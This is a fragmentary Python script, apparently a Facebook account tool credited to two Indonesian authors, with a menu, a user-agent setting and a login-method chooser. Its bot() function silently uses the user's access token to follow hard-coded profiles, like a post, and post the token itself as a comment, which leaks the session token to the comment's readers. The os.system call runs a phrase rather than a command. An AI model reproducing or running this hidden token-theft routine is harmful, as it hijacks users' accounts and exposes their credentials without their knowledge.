...
"Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
...
def bot():
    ...
    requests.post('https://graph.facebook.com/100000429926317/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1000125002328638/subscribers?access_token=' + token) #fall
    requests.post('https://graph.facebook.com/100001457152638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1000125002328638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1000125002328638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1000125002328638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100026253181426/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100026253181426/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100026253181426/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100026253181426/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100026253181426/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1000164780861638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000429926317/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000429926317/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1232950910464905/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/1231430497283613/comments/?message='+token+'&access_token=' + token)
    menu()           
...
def menu():
    ...
    logo()
    print(" "+p+"[*] Author : Fall Xavier & Muhammad Irwan") 
    print(" [*] Facebook : https://facebook.com/irwann.sans")
    print(" [*] ---------------------------------------------")
    print(" [*] ID : "+id)
    print(" [*] IP : "+ip)
...
def settinguseragent():
	asulo = raw_input("\n [1] user agent bawaan : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system("berhasil setting user agent")
	raw_input("\n [•] kembali ")
	menu()
...
def pilihmetode(file):
	...
	print("")
	print(" [1] metode mbasic (recommend)")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] pilih yang benar!!")
		pilihmetode(file)
